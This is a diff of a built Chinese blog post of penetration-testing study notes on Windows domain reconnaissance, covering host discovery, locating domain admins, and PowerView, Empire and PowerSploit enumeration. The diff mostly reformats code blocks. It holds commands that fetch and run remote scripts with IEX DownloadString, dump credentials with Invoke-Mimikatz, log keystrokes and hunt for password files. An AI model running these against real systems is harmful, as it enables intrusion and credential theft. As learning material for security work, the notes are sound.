+for /l %i in (1,1,254) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i "Ping"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909170827618.png" alt="image-20230909170827618"></p>
 <h4 id="arp-scan-exe">arp-scan.exe</h4>
 <p>基于arp协议来进行存活性扫描</p>
 <p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></p>
-<p><img src="image-20230909171039223.png" alt="image-20230909171039223"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909171039223.png" alt="image-20230909171039223"></p>
 <p>这个工具的速度比上一个快很多</p>
 <h4 id="批处理脚本">批处理脚本</h4>
 <p>这个批处理文件可用于对内网工作组和域内存活主机进行简单的扫描探测，并且支持中英文操作系统。</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off<br>@<span class="hljs-built_in">echo</span>.<br>@FOR /F <span class="hljs-string">"usebackq delims=, "</span> %%J IN (`net view /domain ^|find <span class="hljs-string">"命令成功完成"</span> /v ^|find <span class="hljs-string">"The command completed successfully."</span> /v ^|find <span class="hljs-string">"命令成功完成"</span> /v ^|find <span class="hljs-string">"--"</span> /v ^|find <span class="hljs-string">"Domain"</span> /v ^|find <span class="hljs-string">""</span> /v ^|find <span class="hljs-string">"コマンドは正常に終了しました"</span> /v /i`) <span class="hljs-keyword">do</span> (<br>@<span class="hljs-built_in">echo</span> ====== Domain:%%J =========<br>@FOR /F <span class="hljs-string">"usebackq eol=; delims=, "</span> %%i <span class="hljs-keyword">in</span> (`net view /domain:%%J ^|findstr <span class="hljs-string">"\\"</span>`) <span class="hljs-keyword">do</span> (<br>@FOR /F <span class="hljs-string">"usebackq eol=; tokens=1,2,3* delims=\\"</span> %%a <span class="hljs-keyword">in</span> (`@<span class="hljs-built_in">echo</span> %%i`) <span class="hljs-keyword">do</span> (<br>ping %%a -4 -n 1 -w 100 |find /i <span class="hljs-string">"ping"</span> &gt; %%a.txt<br>@FOR /F <span class="hljs-string">"tokens=2 delims=[]"</span> %%b <span class="hljs-keyword">in</span> (%%a.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> \\%%a = [%%b]<br>@del /f /q %%a.txt<br>)))<br>@<span class="hljs-built_in">echo</span> ====== Getting IP Complete ======<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off
+@echo.
+@FOR /F <span class="token string">"usebackq delims=, "</span> %%J IN <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>net view /domain ^<span class="token operator">|</span><span class="token function">find</span> <span class="token string">"命令成功完成"</span> /v ^<span class="token operator">|</span><span class="token function">find</span> <span class="token string">"The command completed successfully."</span> /v ^<span class="token operator">|</span><span class="token function">find</span> <span class="token string">"命令成功完成"</span> /v ^<span class="token operator">|</span><span class="token function">find</span> <span class="token string">"--"</span> /v ^<span class="token operator">|</span><span class="token function">find</span> <span class="token string">"Domain"</span> /v ^<span class="token operator">|</span><span class="token function">find</span> <span class="token string">""</span> /v ^<span class="token operator">|</span><span class="token function">find</span> <span class="token string">"コマンドは正常に終了しました"</span> /v /i<span class="token variable">`</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token punctuation">(</span>
+@echo <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> Domain:%%J <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+@FOR /F <span class="token string">"usebackq eol=; delims=, "</span> %%i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>net view /domain:%%J ^<span class="token operator">|</span>findstr <span class="token string">"<span class="token entity" title="\\">\\</span>"</span><span class="token variable">`</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token punctuation">(</span>
+@FOR /F <span class="token string">"usebackq eol=; tokens=1,2,3* delims=<span class="token entity" title="\\">\\</span>"</span> %%a <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>@echo %%i<span class="token variable">`</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token punctuation">(</span>
+<span class="token function">ping</span> %%a <span class="token parameter variable">-4</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> <span class="token parameter variable">-w</span> <span class="token number">100</span> <span class="token operator">|</span><span class="token function">find</span> /i <span class="token string">"ping"</span> <span class="token operator">&gt;</span> %%a.txt
+@FOR /F <span class="token string">"tokens=2 delims=[]"</span> %%b <span class="token keyword">in</span> <span class="token punctuation">(</span>%%a.txt<span class="token punctuation">)</span> <span class="token keyword">do</span> @echo <span class="token punctuation">\</span><span class="token punctuation">\</span>%%a <span class="token operator">=</span> <span class="token punctuation">[</span>%%b<span class="token punctuation">]</span>
+@del /f /q %%a.txt
+<span class="token punctuation">))</span><span class="token punctuation">)</span>
+@echo <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> Getting IP Complete <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="msf主机存活扫描">msf主机存活扫描</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auxiliary/scanner/discovery/udp_sweep<br>auxiliary/scanner/discovery/udp_probe<br>auxiliary/scanner/netbios/nbname<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">auxiliary/scanner/discovery/udp_sweep
+auxiliary/scanner/discovery/udp_probe
+auxiliary/scanner/netbios/nbname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>MSF建立会话拿到shell，即可直接执行DOS命令至今进行信息收集。也可以进行直接执行run winenum可以一键收集记录。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run winenum<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">run winenum<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h3 id="3-37-定位域管理员">3.37 定位域管理员</h3>
 <h4 id="psloggeddon-exe">psloggeddon.exe</h4>
 <p>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
 <p>psloggedon.exe可以查看本地登陆的用户和通过本地计算机或远程计算机资源登陆的用户。如果指定的是用户名而不是机器名，psloggedon.exe会搜索网上邻居中的所有计算机，并显示该用户是否已经登录。该工具的某些功能需要管理员权限。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">psloggedon.exe [-] [-l] [-x] [\\computername或username]<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">psloggedon.exe [-] [-l] [-x] [\\computername或username]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>查看DC(域控)登录过的机器</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PsLoggedon64.exe -accepteula \\DC<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909171457744.png" alt="image-20230909171457744"></p>
+<pre class="line-numbers language-none"><code class="language-none">PsLoggedon64.exe -accepteula \\DC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909171457744.png" alt="image-20230909171457744"></p>
 <p>查看本地登录的用户</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PsLoggedon64.exe -accepteula<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909171518332.png" alt="image-20230909171518332"></p>
+<pre class="line-numbers language-none"><code class="language-none">PsLoggedon64.exe -accepteula<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909171518332.png" alt="image-20230909171518332"></p>
 <p>查看指定用户登录的计算机</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PsLoggedon64.exe -accepteula Administrator<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909171603538.png" alt="image-20230909171603538"></p>
+<pre class="line-numbers language-none"><code class="language-none">PsLoggedon64.exe -accepteula Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909171603538.png" alt="image-20230909171603538"></p>
 <h4 id="PVEFindADUser-exe">PVEFindADUser.exe</h4>
 <p>下载地址：<a target="_blank" rel="noopener" href="https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/">https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/</a></p>
 <p>PVEFindADUser.exe 可用于查找活动目录用户登陆的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括查找本地用户。通过RDP远程桌面登陆的用户、通过运行服务和计划任务的用户。运行该工具需要计算机配置**.NET Framework 2.0 环境**，并需要有<strong>管理员权限</strong>。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PVEFindADUser.exe &lt;参数&gt;<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">PVEFindADUser.exe &lt;参数&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>我们一般直接运行<code>PVEFindADUser.exe -current</code>命令，即可显示域中所有计算机上当前登陆的所有用户。</p>
-<p><img src="image-20230909175333010-1694253213828-1.png" alt="image-20230909175333010"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909175333010-1694253213828-1.png" alt="image-20230909175333010"></p>
 <p>显示指定用户登录的计算机</p>
 <table>
 <thead>
@@ -1180,8 +1175,9 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
 </tr>
 </tbody>
 </table>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PVEFindADUser.exe -current redteam.org\dc<br>//PVEFindADUser.exe -current domain\username<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909175515361.png" alt="image-20230909175515361"></p>
+<pre class="line-numbers language-none"><code class="language-none">PVEFindADUser.exe -current redteam.org\dc
+//PVEFindADUser.exe -current domain\username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909175515361.png" alt="image-20230909175515361"></p>
 <h4 id="powerview-ps1">powerview.ps1</h4>
 <p>powerview脚本可以用来获取当前域管理员在线登录的服务器，其依赖powershell和wmi，在powersploit工具包中，是一个收集域信息很好用的脚本。</p>
 <ul>
@@ -1189,33 +1185,95 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
 </ul>
 <p>如下，可以看到本地域有一个域管理员：</p>
 <p><code>net group "domain controllers" /domain</code></p>
-<p><img src="image-20230909180145971.png" alt="image-20230909180145971"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909180145971.png" alt="image-20230909180145971"></p>
 <p>我们通过Invoke-UserHunter（等于Invoke-UserHunter -CheckAccess)来定位他们：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell.exe -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/powersploit/Recon/PowerView.ps1');Invoke-UserHunter<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230909181558855.png" alt="image-20230909181558855"></p>
+<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/powersploit/Recon/PowerView.ps1');Invoke-UserHunter<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909181558855.png" alt="image-20230909181558855"></p>
 <p>详情请执行<code>Get-Help Invoke-UserHunter</code>命令查看，具体使用方法与前两个相似，它可以找到域内特定的用户群，接受用户名、用户列表和域组列表查询，接受一个主机列表或查询可用的主机域名。一切都是灵活的，让你自己定义找寻谁，在哪里找。</p>
 <p>获取指定用户在线机器：</p>
-<p><img src="image-20230909185333858.png" alt="image-20230909185333858"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909185333858.png" alt="image-20230909185333858"></p>
 <h3 id="3-38-Empire信息收集">3.38 Empire信息收集</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等<br>usemodule situation_awareness/host/winenum<br># 目标主机事件日志、应用程序控制策略日志、RDP登录信息、PowerShell脚本运行和保存的信息等，需要管理员权限<br>usemodule situational_awareness/host/computerdetails<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none"># 查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等
+usemodule situation_awareness/host/winenum
+# 目标主机事件日志、应用程序控制策略日志、RDP登录信息、PowerShell脚本运行和保存的信息等，需要管理员权限
+usemodule situational_awareness/host/computerdetails<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="3-39-powersploit-信息收集">3.39 powersploit 信息收集</h3>
 <p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>
 ，已经停止维护</p>
 <p>建立会话后的meterpreter：</p>
-<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#加载模块</span><br>load powershell<br><span class="hljs-comment">#调用本地ps脚本</span><br>powershell_import /usr/share/windows<span class="hljs-literal">-resources</span>/powersploit/Recon/xx.ps1<br><span class="hljs-comment">#命令执行</span><br>powershell_execute  <span class="hljs-built_in">Get-NetDomain</span> <br><span class="hljs-comment">#获取当前的域名称</span><br><span class="hljs-built_in">Get-NetDomain</span>  <br><span class="hljs-comment">#返回所有域内成员的详细信息</span><br><span class="hljs-built_in">Get-Netuser</span> <br><span class="hljs-comment">#获取所有的域内的控制器信息</span><br><span class="hljs-built_in">Get-NetDomainController</span> <br><span class="hljs-comment">#获取所有域内机器的名称</span><br><span class="hljs-built_in">Get-NetComputer</span>  <br><span class="hljs-comment">#获取域内的所有的网络共享</span><br><span class="hljs-built_in">Get-Netshare</span><br><span class="hljs-comment">#获取指定服务的远程连接信息  </span><br><span class="hljs-built_in">Get-NetRDPSESSION</span>  <br><span class="hljs-comment">#获取进程的详细信息</span><br><span class="hljs-built_in">Get-NetProcess</span>  <br><span class="hljs-comment"># 获取活动目录的信息</span><br><span class="hljs-built_in">Get-ADOPJECT</span> <br><span class="hljs-comment">#判断用户是否登陆计算机且用户是否有管理员权限</span><br><span class="hljs-built_in">invoke-processhunter</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#加载模块</span>
+load powershell
+<span class="token comment">#调用本地ps脚本</span>
+powershell_import <span class="token operator">/</span>usr/share/windows-resources/powersploit/Recon/xx<span class="token punctuation">.</span>ps1
+<span class="token comment">#命令执行</span>
+powershell_execute  <span class="token function">Get-NetDomain</span> 
+<span class="token comment">#获取当前的域名称</span>
+<span class="token function">Get-NetDomain</span>  
+<span class="token comment">#返回所有域内成员的详细信息</span>
+<span class="token function">Get-Netuser</span> 
+<span class="token comment">#获取所有的域内的控制器信息</span>
+<span class="token function">Get-NetDomainController</span> 
+<span class="token comment">#获取所有域内机器的名称</span>
+<span class="token function">Get-NetComputer</span>  
+<span class="token comment">#获取域内的所有的网络共享</span>
+<span class="token function">Get-Netshare</span>
+<span class="token comment">#获取指定服务的远程连接信息  </span>
+<span class="token function">Get-NetRDPSESSION</span>  
+<span class="token comment">#获取进程的详细信息</span>
+<span class="token function">Get-NetProcess</span>  
+<span class="token comment"># 获取活动目录的信息</span>
+<span class="token function">Get-ADOPJECT</span> 
+<span class="token comment">#判断用户是否登陆计算机且用户是否有管理员权限</span>
+<span class="token function">invoke-processhunter</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>powersploit无文件攻击<br>
 将下载的文件放在vps上面。确保目标服务器可以访问：</p>
 <p>如：<a target="_blank" rel="noopener" href="http://xxx.com/PowerSplot/Recon/Invoke-Portscan.ps1">http://xxx.com/PowerSplot/Recon/Invoke-Portscan.ps1</a></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#在目标机导入脚本：<br>iex(new-object net.webclient).downloadstring("http://192.168.1.4/PowerSploit/Recon/Invoke-Portscan.ps1")<br>#扫描网段、端口<br>invoke-portscan -hosts 192.168.1.1/24 -ports "21,22,80,139,80,445"<br>#invoke-mimikatz抓取hash<br>iex(new-object net.webclient).downloadstring("http://192.168.1.4/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1")<br>#导hash<br>Invoke-Mimikatz -dumpcreds<br>#get-keystrokes键盘记录<br>iex(new-object net.webclient).downloadstring("http://192.168.1.4/PowerSploit/Exfiltration/Get-Keystrokes.ps1")<br>#将键盘记录保存到123.txt里面<br>Get-Keystrokes -logpath C:\Users\admin\123.txt<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#在目标机导入脚本：
+iex(new-object net.webclient).downloadstring("http://192.168.1.4/PowerSploit/Recon/Invoke-Portscan.ps1")
+#扫描网段、端口
+invoke-portscan -hosts 192.168.1.1/24 -ports "21,22,80,139,80,445"
+#invoke-mimikatz抓取hash
+iex(new-object net.webclient).downloadstring("http://192.168.1.4/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1")
+#导hash
+Invoke-Mimikatz -dumpcreds
+#get-keystrokes键盘记录
+iex(new-object net.webclient).downloadstring("http://192.168.1.4/PowerSploit/Exfiltration/Get-Keystrokes.ps1")
+#将键盘记录保存到123.txt里面
+Get-Keystrokes -logpath C:\Users\admin\123.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="3-40-翻翻配置文件">3.40 翻翻配置文件</h3>
 <p>一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">findstr  /s /m "password" *.*<br>findstr /s /i /m /r "defineclass remoteserver" Web目录 \*.jsp<br># /r 表示正则，/s表示遍历子目录，/m表示不显示匹配<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">findstr  /s /m "password" *.*
+findstr /s /i /m /r "defineclass remoteserver" Web目录 \*.jsp
+# /r 表示正则，/s表示遍历子目录，/m表示不显示匹配<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>Linux查文件：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">find Web应用目录 -iname "*.jsp*" | xargs egrep -l -i "classloader" |xargs egrep -l -i "cipher"<br>find Web应用目录 -iname "*.php*" | xargs egrep -l -i "openssl_decrypt" |xargs egrep -l -i "file_get_contents"<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">find Web应用目录 -iname "*.jsp*" | xargs egrep -l -i "classloader" |xargs egrep -l -i "cipher"
+find Web应用目录 -iname "*.php*" | xargs egrep -l -i "openssl_decrypt" |xargs egrep -l -i "file_get_contents"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>敏感路径</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%WINDIR%<br>%WINDIR%\system32\<br>%TEMP%<br>%LOCALAPPDATA%<br>%APPDATA%<br>C:\TEMP\<br>C:\Windows\Temp<br>%UserProfile%\Downloads<br>%UserProfile%\Recent<br>C:\$Recycle.bin<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">%WINDIR%
+%WINDIR%\system32\
+%TEMP%
+%LOCALAPPDATA%
+%APPDATA%
+C:\TEMP\
+C:\Windows\Temp
+%UserProfile%\Downloads
+%UserProfile%\Recent
+C:\$Recycle.bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>常用应用的默认配置路径：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Tomcat:<br>CATALINA_HOME/conf/tomcat-users.xml<br><br>Apache:<br>/etc/httpd/conf/httpd.conf<br><br>Nginx:<br>/etc/nginx/nginx.conf<br><br>Wdcp:<br>/www/wdlinux/wdcp/conf/mrpw.conf<br><br>Mysql:<br>mysql\data\mysql\user.MYD<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Tomcat:
+CATALINA_HOME/conf/tomcat-users.xml
+
+Apache:
+/etc/httpd/conf/httpd.conf
+
+Nginx:
+/etc/nginx/nginx.conf
+
+Wdcp:
+/www/wdlinux/wdcp/conf/mrpw.conf
+
+Mysql:
+mysql\data\mysql\user.MYD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>还有一些<strong>Navicat,TeamViewer,FileZilla,WinSCP,Xmangager</strong>系列产品（Xshell,Xftp)的密码查看</p>
 <p>项目: <a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p>
 <h3 id="3-41-BloodHound域分析工具">3.41 BloodHound域分析工具</h3>
@@ -1233,9 +1291,9 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
 <p><a target="_blank" rel="noopener" href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p>
 </li>
 </ol>
-<p><img src="image-20230909190630424.png" alt="image-20230909190630424"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909190630424.png" alt="image-20230909190630424"></p>
 <p>开启服务</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">neo4j.bat console<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">neo4j.bat console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里发现有点问题，就先放弃了。留个标记等日后需要拾起-  . -</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jiufang/p/16451978.html">域分析工具BloodHound使用教程 </a></p>
 <h3 id="3-42-使用empire收集信息">3.42 使用empire收集信息</h3>
@@ -1331,100 +1389,7 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
                 </div>
             </div>
             
-                <style>
-    #reward {
-        margin: 40px 0;
-        text-align: center;
-    }
-
-    #reward .reward-link {
-        font-size: 1.4rem;
-        line-height: 38px;
-    }
-
-    #reward .btn-floating:hover {
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    #rewardModal {
-        width: 320px;
-        height: 350px;
-    }
-
-    #rewardModal .reward-title {
-        margin: 15px auto;
-        padding-bottom: 5px;
-    }
-
-    #rewardModal .modal-content {
-        padding: 10px;
-    }
-
-    #rewardModal .close {
-        position: absolute;
-        right: 15px;
-        top: 15px;
-        color: rgba(0, 0, 0, 0.5);
-        font-size: 1.3rem;
-        line-height: 20px;
-        cursor: pointer;
-    }
-
-    #rewardModal .close:hover {
-        color: #ef5350;
-        transform: scale(1.3);
-        -moz-transform:scale(1.3);
-        -webkit-transform:scale(1.3);
-        -o-transform:scale(1.3);
-    }
-
-    #rewardModal .reward-tabs {
-        margin: 0 auto;
-        width: 210px;
-    }
-
-    .reward-tabs .tabs {
-        height: 38px;
-        margin: 10px auto;
-        padding-left: 0;
-    }
-
-    .reward-content ul {
-        padding-left: 0 !important;
-    }
-
-    .reward-tabs .tabs .tab {
-        height: 38px;
-        line-height: 38px;
-    }
-
-    .reward-tabs .tab a {
-        color: #fff;
-        background-color: #ccc;
-    }
-
-    .reward-tabs .tab a:hover {
-        background-color: #ccc;
-        color: #fff;
-    }
-
-    .reward-tabs .wechat-tab .active {
-        color: #fff !important;
-        background-color: #22AB38 !important;
-    }
-
-    .reward-tabs .alipay-tab .active {
-        color: #fff !important;
-        background-color: #019FE8 !important;
-    }
-
-    .reward-tabs .reward-img {
-        width: 210px;
-        height: 210px;
-    }
-</style>
-
-<div id="reward">
+                <div id="reward">
     <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
 
     <!-- Modal Structure -->
@@ -1465,6 +1430,275 @@ powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logon
     
 
     
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
